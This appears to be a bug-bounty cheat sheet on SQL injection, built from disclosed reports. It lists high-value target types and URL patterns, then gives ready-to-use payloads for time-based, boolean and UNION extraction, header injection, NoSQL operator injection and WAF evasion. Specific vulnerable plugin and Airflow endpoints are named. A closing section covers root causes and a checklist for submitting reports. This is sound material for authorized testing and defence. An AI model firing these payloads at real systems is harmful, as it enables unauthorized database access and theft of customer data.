# SQL Injection — 8 Disclosed Reports

---

## High-Signal Targets

- Multi-tenant SaaS search and filter endpoints (one injection = all customer data)
- Analytics and tracking subdomains (less WAF coverage, less tested)
- Regional domain variants (`.cn`, `.co`, `.io`) with less security rigor
- Self-hosted tools: Airflow, GitLab, Jenkins
- `ORDER BY` and `SORT` parameters passed directly to queries
- HTTP headers treated as trusted: `X-Forwarded-For`, `User-Agent`

**URL patterns to test:**
```
/search?q=, /filter?category=, /api/v1/items?id=
/sort?field=, /report?date=, /export?format=
```

---

## Paid Patterns

**Email tracking subdomain (real example):**
```
# sctrack.email.target.com.cn - uid parameter concatenated directly into MySQL
GET /track?uid=1' AND SLEEP(5)--
# Time-based blind confirmation, PII-containing recipient lists enumerable
```

**WordPress plugin album_id:**
```
GET /wp-content/plugins/huge-it-video-gallery/?album_id=1' UNION SELECT 1,2,user(),4--
# Unparameterized query, shared DB credentials across services
```

**Apache Airflow filter parameter:**
```
GET /admin/airflow/log?task_id=1' OR '1'='1
# Superuser DB credentials, path to OS command execution
```

**ORDER BY injection:**
```sql
?sort=name; WAITFOR DELAY '0:0:5'--     (MSSQL)
?sort=name; SELECT SLEEP(5)--           (MySQL)
?sort=(SELECT CASE WHEN (1=1) THEN name ELSE price END)  (boolean-based)
```

**Header injection:**
```
X-Forwarded-For: ' OR SLEEP(5)--
User-Agent: ' UNION SELECT NULL,NULL,@@version--
```

---

## Exploitation Techniques

**1. Error-based detection:**
```sql
'
''
`
')
"))
' OR '1'='1
```

**2. Boolean-blind:**
```sql
' AND 1=1--   (true condition, normal response)
' AND 1=2--   (false condition, different response)
```

**3. Time-based blind:**
```sql
' AND SLEEP(5)--          (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND 1=1 AND SLEEP(5)--
```

**4. UNION-based extraction:**
```sql
' ORDER BY 3--             (enumerate columns)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,user(),version()--
```

**5. NoSQL injection:**
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrong"}}
```

```
GET /login?username=admin&password[$ne]=wrong
```

---

## WAF Bypass Techniques

```sql
SELECT/**/username/**/FROM/**/users    (space substitution)
sElEcT uSeRnAmE fRoM uSeRs             (case variation)
SELECT %55SERNAME FROM users            (URL encoding)
SEL/**/ECT username FROM users         (comment injection)
SELECT username FROM users;--+         (comment variations)
```

---

## Root Causes

1. String concatenation instead of parameterized queries
2. ORM raw query methods called with user input: `Model.where("id = #{params[:id]}")`
3. `ORDER BY` clause not parameterizable - sorted columns must be allowlisted
4. HTTP headers logged to DB without sanitization
5. Shared DB credentials with superuser permissions across services
6. Regional subdomains outside main WAF protection scope

---

## Pre-Submission Validation Gate

1. Can you extract actual data? (DB version, user(), table names, or row data)
2. Is this a multi-tenant platform where one injection exposes all customer data?
3. Is the impact beyond theoretical? (PII extracted, credentials confirmed)
